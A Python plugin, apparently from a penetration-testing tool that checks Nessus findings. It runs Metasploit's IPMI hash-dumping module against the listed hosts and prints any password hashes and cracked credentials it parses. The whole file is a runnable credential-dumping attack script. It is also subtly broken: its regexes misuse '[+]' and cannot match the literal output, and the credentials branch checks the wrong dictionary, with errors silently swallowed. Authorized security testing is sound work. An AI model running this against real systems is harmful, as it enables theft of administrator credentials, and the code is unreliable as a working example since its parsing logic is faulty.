from src.utilities.utilities import find_scan
from src.modules.nv_parse import GroupNessusScanOutput
from src.utilities import logger
import subprocess
import re

code = 20

def get_default_config():
    return """
["20"]
"""

def helper_parse(subparser):
    parser_task1 = subparser.add_parser(str(code), help="IPMI")
    group = parser_task1.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", type=str, help="JSON file")
    group.add_argument("-lf", "--list-file", type=str, help="List file")
    parser_task1.set_defaults(func=solve) 

def solve(args, is_all = False):
    hashes = {}
    creds = {}
    
    l= logger.setup_logging(args.verbose)
    hosts = []
    if args.file:
        scan: GroupNessusScanOutput = find_scan(args.file, code)
        if not scan: 
            if is_all: return
            if not args.ignore_fail: print("No id found in json file")
            return
        hosts = scan.hosts
    elif args.list_file:
        with open(args.list_file, 'r') as f:
            hosts = [line.strip() for line in f]
    
    
    r = r"[+] (.*) - IPMI - Hash found: (.*)"
    r1 =  r"[+] (.*) - IPMI - Hash for user '(.*)' matches password '(.*)'"

    result = ", ".join(h.split(":")[0] for h in hosts)
    command = ["msfconsole", "-q", "-x", f"color false; use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {result}; run; exit"]
    try:
        result = subprocess.run(command, text=True, capture_output=True)
        
        matches = re.findall(r, result.stdout)
        for m in matches:
            if m[0] not in hashes:
                hashes[m[0]] = []
            hashes[m[0]].append(f"{m[1]}")
            
        matches = re.findall(r1, result.stdout)
        for m in matches:
            if m[0] not in hashes:
                creds[m[0]] = []
            creds[m[0]].append(f"{m[1]}:{m[2]}")
                
    except Exception:pass


    
    if len(hashes) > 0:
        print("IPMI hashes dumped:")
        for key, value in hashes.items():
            print(f"{key}:")
            for v in value:
                print(f"\t{v}")

    if len(creds) > 0:
        print("IPMI Creds found:")
        for key, value in creds.items():
            print(f"{key}:")
            for v in value:
                print(f"\t{v}")